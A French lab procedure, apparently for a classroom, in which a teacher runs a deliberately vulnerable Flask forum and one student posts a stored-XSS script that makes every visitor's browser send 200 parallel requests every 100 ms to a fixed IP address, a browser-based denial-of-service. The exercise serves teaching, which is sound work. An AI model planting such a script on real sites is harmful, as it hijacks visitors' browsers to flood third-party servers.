# Procédure

## Démarrer le serveur cible sur le poste du professeur

## Démarrer le forum sur la machine locale (poste du professeur)

- Se placer dans le dossier du projet forumPassoire **cd /path/to/forumPassoire**
- Lancer le serveur flask avec la commande **python3 app.py**
- Vérifier avec un navigateur en allant sur l'adresse **http://127.0.0.1:5000**
- Afficher l'adresse IP du professeur pour que chaque étudiant puisse se connecter au forum

## Créer un post qui envoie des requêtes

- Choisir un étudiant X, le pirate
- Les autres sont les utilisateurs du forum
- X navigue vers http://127.0.0.1:5000/create_post
- X saisit le code suivant dans le post :
```html
Mon message qui va s'afficher
<script>
// Send 100 requests in parallel 
const sendRequests = async () => {
    const url = 'http://10.10.39.27/';
    const requests = [];

    for (let i = 0; i < 200; i++) {
        requests.push(fetch(url, { mode: 'no-cors'}));
    }

    try {
        const responses = await Promise.all(requests);
        const results = await Promise.all(responses.map(response => response.text()));
        console.log(results);
    } catch (error) {
        console.error('Error with requests:', error);
    }
};
// Example: Send 100 requests in parallel
setInterval(sendRequests, 100);
</script>
```
- X publie son post
- Tous les participants rechargent la page du forum
